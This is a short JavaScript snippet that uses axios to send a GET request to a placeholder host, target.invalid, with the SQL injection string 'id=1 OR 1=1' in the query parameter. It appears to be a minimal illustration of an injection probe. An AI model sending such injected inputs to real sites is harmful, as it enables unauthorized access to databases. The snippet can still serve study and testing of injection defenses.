import axios from "axios";

const target = "https://target.invalid/item?id=1 OR 1=1";
axios.get(target);
